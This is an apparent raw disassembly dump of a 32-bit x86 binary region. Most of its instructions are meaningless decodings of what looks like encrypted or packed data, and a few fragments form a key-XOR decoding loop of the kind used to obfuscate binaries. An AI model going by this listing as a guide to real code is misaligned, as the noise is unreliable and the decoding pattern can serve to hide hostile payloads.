  407b82:	sbb    BYTE PTR [ecx-0xc],cl
  407b85:	inc    esp
  407b86:	adc    eax,0x19f82fb0
  407b8b:	in     al,0xa9
  407b8d:	jnp    0x407bcb
  407b8f:	push   edi
  407b90:	or     al,BYTE PTR gs:[edi+0x23]
  407b94:	cmps   DWORD PTR fs:[si],DWORD PTR es:[di]
  407b97:	xchg   DWORD PTR [esi],eax
  407b99:	popf   
  407b9a:	sbb    ch,ch
  407b9c:	xlat   BYTE PTR ds:[ebx]
  407b9d:	dec    edx
  407b9e:	lock mov bl,BYTE PTR [eax-0x392282e7]
  407ba5:	data16 (bad) 
  407ba7:	adc    DWORD PTR [ebp+esi*1-0x692bb6d7],esi
  407bae:	sbb    DWORD PTR [edx+ebx*1-0x2d7beb22],edi
  407bb5:	call   0x5ea:0x992021c1
  407bbc:	sbb    esi,DWORD PTR [edi-0x182f8c87]
  407bc2:	xchg   esi,eax
  407bc3:	xor    ch,BYTE PTR [edi]
  407bc5:	lds    edx,FWORD PTR [ebp-0xe]
  407bc8:	scas   eax,DWORD PTR es:[edi]
  407bc9:	daa    
  407bca:	out    0xdd,al
  407bcc:	sub    eax,0x3c0c6946
  407bd1:	cmp    eax,0x455e0ec2
  407bd6:	test   BYTE PTR [edx-0x21],bl
  407bd9:	sub    esi,DWORD PTR [ecx]
  407bdb:	aad    0x47
  407bdd:	test   al,0x10
  407bdf:	test   al,0x7c
  407be1:	popa   
  407be2:	in     al,0xd7
  407be4:	test   BYTE PTR [ebx-0x229bdcc2],ah
  407bea:	cmovbe ebx,ebp
  407bed:	push   cs
  407bee:	jmp    0x407c05
  407bf0:	sbb    eax,DWORD PTR [ebp+0x1ce5d6ac]
  407bf6:	pusha  
  407bf7:	arpl   bx,bx
  407bf9:	xchg   edi,eax
  407bfa:	jb     0x407bb7
  407bfc:	xchg   esi,eax
  407bfd:	lea    edi,[esi-0x55]
  407c00:	neg    ah
  407c02:	in     al,dx
  407c03:	mov    al,ds:0xaddfb0fa
  407c08:	in     eax,0x22
  407c0a:	mov    cs,WORD PTR [edi-0x1afc601d]
  407c10:	adc    eax,0x4d210f9b
  407c15:	sub    dl,BYTE PTR [ebp+0x5c12f925]
  407c1b:	cmp    al,0xe2
  407c1d:	or     cl,ch
  407c1f:	pop    ds
  407c20:	(bad)  
  407c21:	mov    cl,0x25
  407c23:	outs   dx,DWORD PTR ds:[esi]
  407c24:	sahf   
  407c25:	xchg   ebp,eax
  407c26:	fs inc esp
  407c28:	mov    esp,0x579ce6cc
  407c2d:	sahf   
  407c2e:	xchg   ecx,eax
  407c2f:	xor    al,0x45
  407c31:	in     al,0x54
  407c33:	push   0x62
  407c35:	add    BYTE PTR [edi-0x33522358],ah
  407c3b:	test   dh,al
  407c3d:	fisttp QWORD PTR [esp+edi*1+0x50]
  407c41:	fild   QWORD PTR [esi+0xfe4458b]
  407c47:	scas   eax,DWORD PTR es:[edi]
  407c48:	shr    DWORD PTR [ebx],0xe0
  407c4b:	mov    DWORD PTR [ebp-0x24],esp
  407c4e:	jmp    0x407dd7
  407c53:	dec    esi
  407c54:	cli    
  407c55:	sbb    al,0xe
  407c57:	test   al,0xda
  407c59:	outs   dx,BYTE PTR ds:[esi]
  407c5a:	jp     0x407c98
  407c5c:	out    0x6d,eax
  407c5e:	ror    BYTE PTR [esp+ebx*2+0xb],1
  407c62:	cld    
  407c63:	xor    esp,DWORD PTR [esi]
  407c65:	jl     0x407ce3
  407c67:	call   0xadbcf8eb
  407c6c:	outs   dx,DWORD PTR ds:[esi]
  407c6d:	fidiv  WORD PTR [ebp+0x6]
  407c70:	xor    eax,0x75bd0690
  407c75:	or     eax,0x44c20a28
  407c7a:	rol    DWORD PTR [edx+0x11],cl
  407c7d:	mov    ebx,0x91de70cc
  407c82:	subpd  xmm7,XMMWORD PTR [esi-0x14]
  407c87:	mov    bl,0x46
  407c89:	mov    DWORD PTR [eax],esp
  407c8b:	outs   dx,BYTE PTR ds:[esi]
  407c8c:	lock or esi,DWORD PTR [ebx-0x31]
  407c90:	sar    DWORD PTR [eax+0x25602e5a],1
  407c96:	add    DWORD PTR [eax*1+0xfbb35e5],ebx
  407c9d:	and    BYTE PTR [ecx],ch
  407c9f:	mov    bh,0x3a
  407ca1:	pop    eax
  407ca2:	ds imul edi,ecx,0xfffffff9
  407ca6:	mov    ch,0xd1
  407ca8:	imul   ebx,DWORD PTR [edx],0xac0414af
  407cae:	(bad)  
  407caf:	cwde   
  407cb0:	dec    ecx
  407cb1:	sbb    al,0x9f
  407cb3:	push   edi
  407cb4:	sbb    esi,esi
  407cb6:	(bad)  
  407cb7:	or     bh,dl
  407cb9:	das    
  407cba:	retf   
  407cbb:	int    0xbe
  407cbd:	outs   dx,BYTE PTR ds:[esi]
  407cbe:	push   ecx
  407cbf:	jnp    0x407ccf
  407cc1:	mov    gs,WORD PTR [ecx]
  407cc3:	test   al,0x61
  407cc5:	sbb    bh,BYTE PTR [edx+ebx*4+0x44]
  407cc9:	loope  0x407d28
  407ccb:	das    
  407ccc:	push   0x5b
  407cce:	pop    ds
  407ccf:	pop    ss
  407cd0:	push   esi
  407cd1:	xchg   DWORD PTR [edx],edx
  407cd3:	loop   0x407d53
  407cd5:	pop    ds
  407cd6:	imul   ecx,DWORD PTR gs:0x3ae49e61,0x6e
  407cde:	or     eax,0x6ad3cf59
  407ce3:	mov    esi,0x77b7bb8a
  407ce8:	ins    BYTE PTR es:[edi],dx
  407ce9:	and    al,0xcb
  407ceb:	loopne 0x407d0f
  407ced:	xchg   esi,eax
  407cee:	(bad)  
  407cef:	rol    DWORD PTR [edx+0x7b98f6e5],1
  407cf5:	sti    
  407cf6:	enter  0x94cb,0x70
  407cfa:	imul   eax,esp,0x4
  407cfd:	push   ss
  407cfe:	jmp    0x2d7c0f19
  407d03:	repz aam 0x62
  407d06:	sbb    eax,0x686a8f64
  407d0b:	xchg   edx,eax
  407d0c:	and    DWORD PTR [ecx+0x219a8c2],eax
  407d12:	iret   
  407d13:	xchg   ecx,eax
  407d14:	sub    al,0xd0
  407d17:	adc    DWORD PTR [ecx],edx
  407d19:	bound  esp,QWORD PTR [ecx-0x1defbb57]
  407d1f:	xlat   BYTE PTR ds:[ebx]
  407d20:	pop    esp
  407d21:	out    dx,eax
  407d22:	neg    DWORD PTR [ebp+0x25b5c925]
  407d28:	xor    eax,0xdd942934
  407d2d:	sbb    eax,0xed85bc60
  407d32:	int3   
  407d33:	mov    ah,0xae
  407d35:	adc    ch,BYTE PTR [edx]
  407d37:	les    esp,FWORD PTR [ebp-0xe]
  407d3a:	stos   BYTE PTR es:[edi],al
  407d3b:	add    al,0x18
  407d3d:	dec    esp
  407d3e:	mov    edx,0xc1989530
  407d43:	outs   dx,DWORD PTR ds:[esi]
  407d44:	inc    esi
  407d45:	mov    edi,ss
  407d47:	mov    esi,0xaadf2863
  407d4c:	loop   0x407d9b
  407d4e:	mov    DWORD PTR [ebx-0x13c36687],eax
  407d54:	aam    0xbe
  407d56:	call   0x86d5:0x3016ee22
  407d5d:	jae    0x407cdf
  407d5f:	pop    edi
  407d60:	push   eax
  407d61:	sub    BYTE PTR [esi+0x1d760231],al
  407d67:	mov    cl,0x5e
  407d69:	int3   
  407d6a:	mov    al,ds:0x64111555
  407d6f:	call   0xf51a:0x960ac113
  407d76:	daa    
  407d77:	jecxz  0x407d2a
  407d79:	pop    ds
  407d7a:	jle    0x407d67
  407d7c:	dec    eax
  407d7d:	pop    edx
  407d7e:	test   al,0x41
  407d80:	test   al,0xc3
  407d82:	xor    dl,BYTE PTR [esi+0x5b]
  407d85:	stc    
  407d86:	xchg   edx,eax
  407d87:	sbb    dh,BYTE PTR [ebx]
  407d89:	jno    0x407d37
  407d8b:	lds    eax,FWORD PTR [esi-0x5b7b6719]
  407d91:	cmp    BYTE PTR [ecx-0x7f],al
  407d94:	xchg   ebx,eax
  407d95:	push   esp
  407d96:	mov    ecx,0x2011b66
  407d9b:	(bad)  [eax]
  407d9d:	xor    dh,BYTE PTR [edx]
  407d9f:	retf   0xc202
  407da2:	xor    BYTE PTR ds:0x26b99492,bh
  407da8:	popf   
  407da9:	jbe    0x407dff
  407dab:	imul   edx,esp,0x551b9825
  407db1:	pop    edx
  407db2:	daa    
  407db3:	je     0x407d4e
  407db5:	xchg   DWORD PTR [ecx-0x12f03e7f],eax
  407dbb:	mov    esi,0x50ec9cf8
  407dc0:	ror    DWORD PTR [edx+eiz*1+0x7d446792],0xe4
  407dc8:	dec    ebp
  407dc9:	pop    esp
  407dca:	loop   0x407dff
  407dcc:	or     al,0x13
  407dce:	in     al,dx
  407dcf:	paddsb mm0,mm5
  407dd2:	pushw  cs
  407dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dd5:	push   esi
  407dd6:	fmul   DWORD PTR [ebx+0x57b9fc45]
  407ddc:	or     BYTE PTR [ecx+0x7],dl
  407ddf:	xor    eax,ecx
  407de1:	mov    edx,0x32729e
  407de6:	add    eax,edx
  407de8:	jmp    0x407f71
  407ded:	push   0xffffffd5
  407def:	mov    ebp,0x7d64bd94
  407df4:	aad    0x16
  407df6:	sbb    bl,BYTE PTR [esi-0x17288d72]
  407dfc:	sbb    DWORD PTR [edi-0x178383c7],ebp
  407e02:	jg     0x407e80
  407e04:	jl     0x407e3a
  407e06:	retf   0x78ee
  407e09:	sub    eax,0x2874ac20
  407e0e:	jb     0x407e41
  407e10:	retf   0xac69
  407e13:	fcmovne st,st(6)
  407e15:	cwde   
  407e16:	mov    cl,0xa7
  407e18:	stc    
  407e19:	scas   eax,DWORD PTR es:[edi]
  407e1a:	add    dh,bl
  407e1c:	pop    esp
  407e1d:	mov    bl,BYTE PTR [ebp+0x7dda0c52]
  407e23:	mov    es,WORD PTR [ebp+0x28b7da5a]
  407e29:	or     BYTE PTR [edi],bl
  407e2b:	lds    ebp,FWORD PTR ds:0xbacb2816
  407e31:	je     0x407e39
  407e33:	pop    edx
  407e34:	sbb    eax,0x1eda237a
  407e39:	dec    edi
  407e3a:	std    
  407e3b:	rsm    
  407e3d:	loop   0x407eb2
  407e3f:	cwde   
  407e40:	mov    cl,0x82
  407e42:	xchg   edx,eax
  407e43:	arpl   WORD PTR [eax-0x1],sp
  407e46:	out    0x94,ax
  407e49:	shl    BYTE PTR [esi+0x19],0xd1
  407e4d:	dec    eax
  407e4e:	mov    edx,0xeff29469
  407e53:	push   esi
  407e54:	or     DWORD PTR [esi+0x2ca4f751],edi
  407e5a:	jecxz  0x407e0b
  407e5c:	call   0x1063e2c1
  407e61:	loop   0x407e91
  407e63:	mov    al,ds:0x7a7b43d1
  407e68:	fwait
  407e69:	push   edx
  407e6a:	inc    esi
  407e6b:	pop    ebp
  407e6c:	sub    al,0xf8
  407e6e:	mov    bh,BYTE PTR [esi+ebp*2-0x7d5d4406]
  407e75:	mov    dh,0x96
  407e77:	jecxz  0x407e2b
  407e79:	mov    BYTE PTR [ecx-0x2b],bh
  407e7c:	sub    edi,ebx
  407e7e:	sbb    al,ch
  407e80:	push   0xffffff89
  407e82:	mov    edi,0x1185afe3
  407e87:	icebp  
  407e88:	in     eax,dx
  407e89:	sub    eax,0x5f3f0da4
  407e8e:	lock repz push 0x9be98f74
  407e95:	inc    ecx
  407e96:	out    dx,eax
  407e97:	call   0x707fef33
  407e9c:	ins    DWORD PTR es:[edi],dx
  407e9d:	mov    edi,0xfb48fed2
  407ea2:	nop
  407ea3:	sub    DWORD PTR [edi],0xffffffd1
  407ea6:	sub    al,0x78
  407ea8:	jne    0x407e55
  407eaa:	jmp    0xc828:0x9f815736
  407eb1:	pop    ebp
  407eb2:	add    edi,DWORD PTR [ebx]
  407eb4:	aas    
  407eb5:	adc    DWORD PTR [ebp-0x7d],0x9828e3e7
  407ebc:	stos   DWORD PTR es:[edi],eax
  407ebd:	out    0x53,eax
  407ebf:	pop    edi
  407ec0:	ss xor esp,ebp
  407ec3:	pop    ecx
  407ec4:	push   ebx
  407ec5:	in     al,dx
  407ec6:	inc    eax
  407ec7:	repnz cmp al,0x6c
  407eca:	imul   edx,edx,0x13df5439
  407ed0:	retf   0xa14d
  407ed3:	xlat   BYTE PTR ds:[ebx]
  407ed4:	aad    0xa0
  407ed6:	clc    
  407ed7:	or     eax,0x55f2f1b
  407edc:	sbb    eax,0x560f746b
  407ee1:	shr    DWORD PTR [ecx+0x79],1
  407ee4:	es jns 0x407f5b
  407ee7:	add    al,0xa6
  407ee9:	mov    edx,?
  407eeb:	pop    esp
  407eec:	fbstp  TBYTE PTR [esi]
  407eee:	sbb    eax,0xcbcc5a03
  407ef3:	sbb    ecx,ebp
  407ef5:	aam    0xf
  407ef7:	xchg   ecx,eax
  407ef8:	retf   0xa336
  407efb:	cmp    DWORD PTR [edi+0x12],edi
  407efe:	dec    ebp
  407eff:	test   al,0xe4
  407f01:	sub    al,BYTE PTR [ebx]
  407f03:	ds xor eax,0x93000453
  407f09:	repnz sub bh,BYTE PTR [ecx+0x57602268]
  407f10:	push   edx
  407f11:	mov    cl,0xe8
  407f13:	scas   ax,WORD PTR es:[edi]
  407f15:	dec    edi
  407f16:	scas   al,BYTE PTR es:[edi]
  407f17:	mov    esi,0x43251707
  407f1c:	es jecxz 0x407f5e
  407f1f:	dec    esp
  407f20:	xchg   esi,eax
  407f21:	xor    al,0x90
  407f23:	inc    ecx
  407f24:	or     BYTE PTR [ebx+0x26],bl
  407f27:	mov    eax,ds:0xe9c25502
  407f2c:	sbb    cl,BYTE PTR [edi]
  407f2e:	mov    esp,0x10d721f9
  407f33:	mov    ah,0x39
  407f35:	add    DWORD PTR [esi+0x50],ebp
  407f38:	and    WORD PTR ds:0x22537653,dx
  407f3f:	jns    0x407f3b
  407f41:	sub    eax,0x30080bcf
  407f46:	addr16 (bad) 
  407f48:	push   eax
  407f49:	dec    BYTE PTR [eax-0x654ba847]
  407f4f:	data16 adc al,0xf4
  407f52:	mov    ebx,0xf6588e4c
  407f57:	xchg   DWORD PTR [edi-0x5f],ecx
  407f5a:	test   DWORD PTR [ebp-0x1c],ebp
  407f5d:	adc    eax,0x2107fdf
  407f62:	imul   BYTE PTR [ebp+ebx*8+0xd4c36a0]
  407f69:	push   0x9fbf8408
  407f6e:	push   ebp
  407f6f:	dec    ecx
  407f70:	mov    ecx,0x8b084589
  407f75:	inc    ebp
  407f76:	call   0xc24440ae
  407f7b:	mov    edx,DWORD PTR [ebp+0x14]
  407f7e:	imul   eax,DWORD PTR [edx]
  407f81:	mov    edx,DWORD PTR [ebp-0x4]
  407f84:	xor    edx,ecx
  407f86:	mov    ecx,DWORD PTR [ebp+0x8]
  407f89:	lea    ecx,[edx+ecx*1+0x32729e]
  407f90:	cmp    ecx,eax
  407f92:	je     0x4087b6
  407f98:	mov    edi,DWORD PTR [ebp-0x18]
  407f9b:	mov    eax,DWORD PTR [ebp+0x8]
  407f9e:	mov    edx,DWORD PTR [ebp+0x14]
  407fa1:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  407fa5:	mov    ecx,0x7510857
  407faa:	xor    edx,edx
  407fac:	xor    edi,ecx
  407fae:	mov    esi,0x32729e
  407fb3:	add    edi,esi
  407fb5:	jmp    0x40813e
  407fba:	je     0x40800f
  407fbc:	jne    0x407fa1
  407fbe:	ins    DWORD PTR es:[edi],dx
  407fbf:	gs out 0x7b,al
  407fc2:	aam    0xcc
  407fc4:	pop    es
  407fc5:	sbb    dl,BYTE PTR [si+0x58]
  407fc9:	mov    dl,0x1b
  407fcb:	cmp    edi,DWORD PTR [esp+edi*2-0x18]
  407fcf:	jg     0x40804d
  407fd1:	jl     0x40800d
  407fd3:	xlat   BYTE PTR ds:[ebx]
  407fd4:	push   ss
  407fd5:	ret    0x8e41
  407fd8:	sub    eax,0x2880b5d
  407fdd:	xchg   cl,bh
  407fdf:	adc    dl,BYTE PTR [eax+0x4314fcb8]
  407fe5:	ins    BYTE PTR es:[edi],dx
  407fe6:	ja     0x407faa
  407fe8:	retf   
  407fe9:	mov    cl,0x14
  407feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fec:	js     0x407fbf
  407fee:	pop    eax
  407fef:	lds    edx,FWORD PTR [eax+0x7497242a]
  407ff5:	out    0x69,eax
  407ff7:	jb     0x407fa2
  407ff9:	sbb    eax,0x92891a7f
  407ffe:	ins    DWORD PTR es:[edi],dx
  407fff:	or     DWORD PTR [eax+0x50a9b0ce],esi
  408005:	mov    BYTE PTR [edi],0xdc
  408008:	sbb    DWORD PTR [ecx+0xe],esi
  40800b:	jnp    0x40802e
  40800d:	xlat   BYTE PTR ds:[ebx]
  40800e:	outs   dx,BYTE PTR ds:[esi]
  40800f:	and    BYTE PTR [edx+0x3e0b7d93],ah
  408015:	shr    ah,cl
  408017:	loopne 0x40800f
  408019:	pop    edi
  40801a:	aad    0x44
  40801c:	enter  0xd3be,0xd6
  408020:	popa   
  408021:	retf   
  408022:	and    al,0x4b
  408024:	ins    BYTE PTR es:[edi],dx
  408025:	shl    dh,0xc2
  408028:	std    
  408029:	xchg   edx,eax
  40802a:	add    DWORD PTR [eax+edi*1],ebx
  40802d:	sti    
  40802e:	cmp    dh,dl
  408030:	rol    esp,0x7f
  408033:	lds    ecx,FWORD PTR [ecx+ebp*1-0x62]
  408037:	mov    ebx,DWORD PTR [ebx]
  408039:	mov    bh,0x2c
  40803b:	add    al,0x72
  40803d:	dec    ebp
  40803e:	fcomp  DWORD PTR [ebp+0x79ce2bf1]
  408044:	cwde   
  408045:	mov    edx,DWORD PTR [edi]
  408047:	mov    ecx,?
  408049:	clc    
  40804a:	retf   
  40804b:	sub    eax,0x4e9472bd
  408050:	mov    ah,BYTE PTR [ebx+edx*2-0x65fbacc6]
  408057:	vandnps ymm3,ymm3,YMMWORD PTR [eax+0x76]
  40805c:	cmp    eax,0x20fa6224
  408061:	mov    ah,0x6e
  408063:	repnz cli 
  408065:	add    DWORD PTR [ecx-0x21],ecx
  408068:	or     al,0xf5
  40806a:	or     BYTE PTR [eax+ebp*1-0x5dc278dd],dl
  408071:	arpl   WORD PTR [edx+edx*4+0x7db3c950],cx
  408078:	mov    DWORD PTR [edx+0x3b9bacff],edx
  40807e:	loop   0x40801a
  408080:	rol    DWORD PTR [esi+0x68],1
  408083:	popf   
  408084:	pop    edx
  408085:	push   0x7820f73d
  40808a:	das    
  40808b:	push   edi
  40808c:	mov    eax,ds:0xbf483cc5
  408091:	add    BYTE PTR [ecx],cl
  408093:	xor    ebx,eax
  408095:	or     DWORD PTR [ecx+ebp*2-0x7eef6ff3],esp
  40809c:	sar    BYTE PTR [ebx],0xe4
  40809f:	push   cs
  4080a0:	and    eax,0xfc0fbcfe
  4080a5:	out    0x6b,al
  4080a7:	cmp    eax,0x79242399
  4080ac:	mov    edx,ds
  4080ae:	push   es
  4080af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080b0:	and    eax,0x1c9cf4f
  4080b5:	inc    edi
  4080b6:	cmp    al,0xa1
  4080b8:	cld    
  4080b9:	add    DWORD PTR [esi+eax*4-0x23370cf5],ebp
  4080c0:	push   ebp
  4080c1:	dec    ebx
  4080c2:	lahf   
  4080c3:	adc    ch,BYTE PTR [edx]
  4080c5:	in     eax,dx
  4080c6:	adc    ebp,edx
  4080c8:	cmp    dl,BYTE PTR [eax+ebp*1+0x27]
  4080cc:	cld    
  4080cd:	pop    ds
  4080ce:	jmp    0x890cabc2
  4080d3:	call   0x6143:0xc56981e4
  4080da:	sub    cl,BYTE PTR [ebx]
  4080dc:	mov    esp,0x4016d391
  4080e1:	jno    0x4080eb
  4080e3:	inc    ebp
  4080e4:	jge    0x408095
  4080e6:	xchg   ecx,eax
  4080e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e8:	xchg   DWORD PTR [edx],ebx
  4080ea:	lds    edx,FWORD PTR ss:[eax-0x65e65ccc]
  4080f1:	sub    al,BYTE PTR [ebx]
  4080f3:	lea    esp,[ebp+0x27]
  4080f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080f7:	jecxz  0x4080c7
  4080f9:	inc    ebx
  4080fa:	push   ss
  4080fb:	leave  
  4080fc:	sti    
  4080fd:	pop    esp
  4080fe:	pop    ebx
  4080ff:	pop    ds
  408100:	inc    ebp
  408101:	xchg   esp,eax
  408102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408104:	fnsave [edi+0x69]
  408107:	sbb    bh,BYTE PTR [ebp-0x36]
  40810a:	call   0x11f8:0x5989ef57
  408111:	inc    ecx
  408112:	adc    ecx,DWORD PTR [ebx+0x3a5bd929]
  408118:	xor    BYTE PTR [edx],ch
  40811a:	std    
  40811b:	pop    eax
  40811c:	stos   BYTE PTR es:[edi],al
  40811d:	dec    esi
  40811e:	fbstp  TBYTE PTR [ecx]
  408120:	(bad)  
  408121:	mov    eax,ds:0xe79ff2c3
  408126:	sahf   
  408127:	mov    ecx,0x7d5549ea
  40812c:	xchg   BYTE PTR [eax+eax*1],dh
  40812f:	mov    esp,DWORD PTR [edx+ecx*2+0x52]
  408133:	in     al,dx
  408134:	fmul   st(7),st
  408136:	call   0x8901a24b
  40813b:	icebp  
  40813c:	mov    bh,0xbb
  40813e:	div    edi
  408140:	mov    edx,DWORD PTR [ebp-0x4]
  408143:	xor    edx,ecx
  408145:	lea    eax,[edx+eax*1+0x32729e]
  40814c:	mov    edx,DWORD PTR [ebp+0x8]
  40814f:	mov    edi,DWORD PTR [ebp-0x24]
  408152:	mov    DWORD PTR [edi+edx*4],eax
  408155:	mov    eax,DWORD PTR [ebp-0x18]
  408158:	mov    edx,DWORD PTR [ebp+0x8]
  40815b:	xor    eax,ecx
  40815d:	lea    eax,[eax+edx*1+0x32729e]
  408164:	mov    DWORD PTR [ebp+0x8],eax
  408167:	mov    eax,DWORD PTR [ebp-0x18]
  40816a:	jmp    0x4082f3
  40816f:	sahf   
  408170:	mov    eax,0x7dfa3de4
  408175:	push   ebp
  408176:	mov    ebx,0x5d2a391f
  40817b:	sbb    ecx,eax
  40817d:	inc    ebp
  40817e:	push   esi
  40817f:	idiv   DWORD PTR [edx]
  408181:	jl     0x4081ff
  408183:	call   0x3bbcfe07
  408188:	sbb    eax,0xaa741fce
  40818d:	sahf   
  40818e:	sub    DWORD PTR [edx-0x4],ebp
  408191:	inc    esi
  408192:	mov    ds:0xe625db94,eax
  408197:	jmp    0x408190
  408199:	jmp    0x710f:0xde967030
  4081a0:	mov    ch,0x87
  4081a2:	outs   dx,DWORD PTR ds:[esi]
  4081a3:	mov    ah,0x3e
  4081a5:	and    eax,0x25d05032
  4081aa:	xchg   esi,eax
  4081ab:	dec    esi
  4081ac:	add    dh,BYTE PTR [eax+0x49]
  4081af:	jns    0x40815f
  4081b1:	lock and al,0xd1
  4081b4:	jb     0x408165
  4081b6:	daa    
  4081b7:	outs   dx,BYTE PTR ds:[esi]
  4081b8:	push   ebp
  4081b9:	retf   0xbbe7
  4081bc:	or     DWORD PTR [eax-0x3b4e211],edi
  4081c2:	ds adc eax,0x2fdc7065
  4081c8:	dec    edi
  4081c9:	xchg   ebp,eax
  4081ca:	adc    al,0x6f
  4081cc:	ins    DWORD PTR es:[edi],dx
  4081cd:	lahf   
  4081ce:	inc    ebx
  4081cf:	retf   0x30e4
  4081d2:	mov    cl,0xda
  4081d4:	adc    edx,DWORD PTR [ecx+ebp*1+0x5a60b2a9]
  4081db:	jmp    0x7e228909
  4081e0:	xor    BYTE PTR [edx],dl
  4081e2:	mov    eax,ds:0x5683f15c
  4081e7:	ret    0x8a8b
  4081ea:	jge    0x40821e
  4081ec:	jmp    0x5c93:0x164b81a8
  4081f3:	loope  0x4081bc
  4081f5:	aaa    
  4081f6:	scas   eax,DWORD PTR es:[edi]
  4081f7:	addr16 repz in al,dx
  4081fa:	test   eax,0x9ec5c6df
  4081ff:	out    dx,al
  408200:	icebp  
  408201:	mov    ebp,0xb44d80ad
  408206:	push   0xffffff9e
  408208:	push   edi
  408209:	xchg   ebx,eax
  40820a:	mov    esi,0x728b5d62
  40820f:	xor    dl,ch
  408211:	mov    dh,0x62
  408213:	or     eax,0x61f866c4
  408218:	jecxz  0x40822c
  40821a:	adc    DWORD PTR [edi],ebp
  40821c:	cmp    ebp,DWORD PTR [ebp-0x6db77e69]
  408222:	and    eax,0x47036019
  408227:	dec    ch
  408229:	pop    esi
  40822a:	or     ebp,DWORD PTR [edx-0x3c84513]
  408230:	jno    0x408246
  408232:	add    ecx,DWORD PTR [edx+0xe7accf]
  408238:	out    0xc0,al
  40823a:	sbb    al,0x33
  40823c:	jno    0x4081dc
  40823e:	es cmp al,0x80
  408241:	pop    ebp
  408242:	jp     0x408226
  408244:	push   ebx
  408245:	inc    edi
  408246:	xchg   ebx,eax
  408247:	fldenv [edi]
  408249:	pop    ecx
  40824a:	and    eax,0xfa5e1ae9
  40824f:	nop    DWORD PTR [edx+0x42248a3a]
  408256:	pop    ds
  408257:	adc    al,0x37
  408259:	jmp    0x408292
  40825b:	sbb    BYTE PTR [edi+0x36adc852],dh
  408261:	out    0xa4,eax
  408263:	jle    0x408260
  408265:	push   ebx
  408266:	xor    DWORD PTR [ebp+esi*4+0x2c8995ed],ebx
  40826d:	xchg   DWORD PTR cs:[eax+0x79],esi
  408271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408272:	inc    ebx
  408273:	pop    edi
  408274:	adc    al,0xec
  408276:	and    al,0xe
  408278:	sub    al,0xf1
  40827a:	xchg   sp,ax
  40827c:	inc    edx
  40827d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40827e:	js     0x40829d
  408280:	fisub  DWORD PTR [edx-0xd66873a]
  408286:	mov    dh,0x5d
  408288:	xchg   edx,eax
  408289:	sub    al,0x2a
  40828b:	inc    edi
  40828c:	call   0x1708:0xd4e8c07f
  408293:	adc    esi,DWORD PTR [ecx+ecx*8-0x38911ce5]
  40829a:	jmp    0x7e232e1d
  40829f:	(bad)  
  4082a0:	mov    ds:0x74f6a202,eax
  4082a5:	add    ebp,DWORD PTR gs:[edi]
  4082a8:	test   al,0x90
  4082aa:	jle    0x4082f3
  4082ac:	push   es
  4082ad:	mov    eax,ds:0x5fc6158f
  4082b2:	xor    ebp,DWORD PTR [edx+0x7e3b9fbe]
  4082b8:	add    bh,BYTE PTR [ecx]
  4082ba:	pop    ebp
  4082bb:	gs leave 
  4082bd:	and    ecx,DWORD PTR [eax]
  4082bf:	mov    DWORD PTR [edi-0x29e30b55],ebx
  4082c5:	and    eax,0xf2c139c5
  4082ca:	push   eax
  4082cb:	sbb    BYTE PTR [ecx-0x75],cl
  4082ce:	fsub   st,st(6)
  4082d0:	xlat   BYTE PTR ds:[ebx]
  4082d1:	cdq    
  4082d2:	ret    
  4082d3:	arpl   di,si
  4082d5:	add    BYTE PTR [ebx],dh
  4082d7:	mov    bl,0xac
  4082d9:	mov    ds:0x798042fb,al
  4082de:	dec    edx
  4082df:	pop    ebp
  4082e0:	pop    esi
  4082e1:	rol    dl,0x2c
  4082e4:	cmp    eax,0x256b427c
  4082e9:	sbb    dh,BYTE PTR [ebx]
  4082eb:	mov    DWORD PTR [edi+0x322e8f53],edi
  4082f1:	jg     0x4082a1
  4082f3:	mov    edx,DWORD PTR [ebp+0x14]
  4082f6:	jmp    0x40847f
  4082fb:	ret    0xc507
  4082fe:	out    0xdd,eax
  408300:	std    
  408301:	cli    
  408302:	cmp    eax,0xbb29729
  408307:	outs   dx,BYTE PTR ds:[esi]
  408308:	cmp    eax,0x3d63789b
  40830d:	jl     0x40838b
  40830f:	call   0x7dbcff93
  408314:	ins    DWORD PTR es:[edi],dx
  408315:	sub    cl,bh
  408317:	inc    eax
  408318:	jg     0x40829e
  40831a:	or     eax,0xea634d95
  40831f:	das    
  408320:	cmp    dl,bh
  408322:	das    
  408323:	mov    eax,ebp
  408325:	cmp    al,0xaa
  408327:	repz js 0x40832a
  40832a:	jns    0x4083a3
  40832c:	adc    DWORD PTR [ecx-0x46f81935],0xc5638825
  408336:	xor    bl,BYTE PTR [esi+0x645260e2]
  40833c:	inc    ebp
  40833d:	mov    dh,0xb
  40833f:	in     al,dx
  408340:	mov    eax,0xdff8dd4c
  408345:	in     al,dx
  408346:	xlat   BYTE PTR ds:[ebx]
  408347:	leave  
  408348:	hlt    
  408349:	adc    al,dl
  40834b:	cmp    DWORD PTR [edi],ebx
  40834d:	pop    esi
  40834e:	repz add DWORD PTR [eax-0x7],0xfdf03a7a
  408356:	mov    esp,0xece9a340
  40835b:	fbld   TBYTE PTR [ebp-0x22]
  40835e:	mov    ds,WORD PTR [ebx+0x44]
  408361:	xchg   esp,eax
  408362:	add    bh,BYTE PTR [eax+0x6e]
  408365:	in     al,dx
  408366:	push   0x52
  408368:	xchg   dh,ch
  40836a:	popf   
  40836b:	lds    ebx,FWORD PTR ds:0x53ad654f
  408371:	or     eax,0x61220879
  408376:	jno    0x4083c3
  408378:	xor    al,0x5b
  40837a:	mov    ebx,esp
  40837c:	retf   
  40837d:	jmp    0x631b:0x90c6d8d7
  408384:	push   ebx
  408385:	scas   al,BYTE PTR es:[edi]
  408386:	ret    
  408387:	sub    ebp,0x2e
  40838a:	jecxz  0x4083af
  40838c:	cli    
  40838d:	dec    ebx
  40838e:	mov    ebp,DWORD PTR [edx-0x61]
  408391:	mov    ds:0x6c38a22b,al
  408396:	xor    BYTE PTR [ecx+ecx*1],0x30
  40839a:	(bad)
  40839e:	xchg   edx,eax
  40839f:	rcr    DWORD PTR [edi+0x39a31d29],1
  4083a5:	inc    eax
  4083a6:	lods   al,BYTE PTR ds:[esi]
  4083a7:	xchg   ebx,eax
